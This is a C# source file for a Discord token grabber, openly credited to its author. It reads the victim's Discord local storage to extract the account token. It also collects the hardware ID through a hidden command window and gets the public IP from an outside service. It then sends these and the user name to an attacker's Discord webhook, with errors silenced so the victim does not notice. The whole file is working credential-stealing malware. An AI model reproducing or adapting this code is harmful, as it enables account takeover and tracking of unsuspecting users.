using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Collections.Generic;

namespace DiscordTokenGrabber
{
    /*  | Discord Token, IP Grabber % Hwid Grabber    |
     *  | Coded by coats.#1337                        | 
     *  | [C#, Python, and Web developer (HTML, CSS)] |
     *  | ------------------------------------------- |
     *  | GitHub:                                     |
     *  | https://github.com/xannyyyy                 |
     */

    internal class Program
    {
        internal static void Main() // Main(string[] args)
        {
            var Token = new List<string>();
            HttpClient Http = new HttpClient();

            static string GetHWID() { // Grab Hardware ID | (HWID)
                string CMD = "wmic csproduct get UUID";
                var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
                {
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false};

                var proc = new Process() {
                    StartInfo = procStartInfo};
                proc.Start();
                return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
            }

            string GetIPAddress() { // Grabs IP Address
                string IP = Http.GetStringAsync("http://ip.42.pl/raw").Result;
                return IP;
            }

            try {  // Grabs Token 
                var file = File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}//Discord//Local Storage//leveldb//000005.ldb");
                int index;
                while ((index = file.IndexOf("oken")) != -1) {
                    file = file.Substring(index + "oken".Length);
                }
                Token.Add(file.Split('"')[1]);
            } catch (Exception) { // Doesnt return the error because we dont want the user noticing
                return;
            }   

            for (var i = 0; i < Token.Count; i++)
            {
                string Hwid = GetHWID();
                string IP = GetIPAddress();
                string Webhook = "Full-Webhook-Link-Here";
                string Webhook_Avatar = "https://steamuserimages-a.akamaihd.net/ugc/961973556167374789/672A76928C54C3E57E081E0EB9E9A752B18B1778/";
                string Webhook_Name = "Token Grabber";

                MultipartFormDataContent Payload = new MultipartFormDataContent(); // Send gathered info over Discord Webhook
                Payload.Add(new StringContent(Webhook_Name), "username");
                Payload.Add(new StringContent(Webhook_Avatar), "avatar_url");
                Payload.Add(new StringContent(string.Concat(new string[] {
                "```asciidoc\n"
              + "• PC Name :: ", Environment.UserName,
                "\n• IP :: ", IP,
                "\n• Hardware ID :: ", Hwid,
                "\n• Token :: ", Token[i] + "```"}
                )), "content");
                try {
                    HttpResponseMessage result = Http.PostAsync(Webhook, Payload).Result;
                } catch (Exception) {
                    return;
                }
            }
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }
    }
}
